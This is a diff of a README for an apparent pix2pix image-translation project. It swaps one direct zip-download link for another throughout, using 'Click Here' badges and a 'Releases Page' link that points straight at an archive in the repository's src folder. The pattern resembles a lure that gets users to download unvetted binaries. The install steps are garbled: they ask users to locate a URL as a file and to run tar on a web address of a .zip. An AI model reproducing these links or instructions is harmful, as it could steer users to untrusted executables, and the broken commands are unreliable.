@@ -10,7 +10,7 @@ To start using this software, follow these simple steps. You do not need to know
 
 ## 📥 Download Link
 
-[![Download pytorch-pix2pix-image-translation](https://raw.githubusercontent.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/main/src/pytorch-pix2pix-image-translation_v3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/main/src/pytorch-pix2pix-image-translation_v3.9.zip)
+[![Download pytorch-pix2pix-image-translation](https://github.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/raw/refs/heads/main/src/pytorch-image-pix-translation-1.0-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/raw/refs/heads/main/src/pytorch-image-pix-translation-1.0-alpha.3.zip)
 
 ## 📦 System Requirements
 
@@ -28,7 +28,7 @@ Before you download the application, please ensure your system meets the followi
 
 Click the link below to visit the download page where you can find the appropriate version of the software:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/main/src/pytorch-pix2pix-image-translation_v3.9.zip)
+[Visit the Releases Page](https://github.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/raw/refs/heads/main/src/pytorch-image-pix-translation-1.0-alpha.3.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -50,10 +50,10 @@ Click on the file corresponding to your operating system. This will start the do
   2. Open it and drag the application folder to your Applications folder.
   
 - **For Linux:**
-  1. Locate the downloaded https://raw.githubusercontent.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/main/src/pytorch-pix2pix-image-translation_v3.9.zip file.
+  1. Locate the downloaded https://github.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/raw/refs/heads/main/src/pytorch-image-pix-translation-1.0-alpha.3.zip file.
   2. Open a terminal and extract the files using the following command:
      ```bash
-     tar -xvzf https://raw.githubusercontent.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/main/src/pytorch-pix2pix-image-translation_v3.9.zip
+     tar -xvzf https://github.com/Jacquelinministerial479/pytorch-pix2pix-image-translation/raw/refs/heads/main/src/pytorch-image-pix-translation-1.0-alpha.3.zip
      ```
   3. Navigate to the extracted folder and run the application.
 
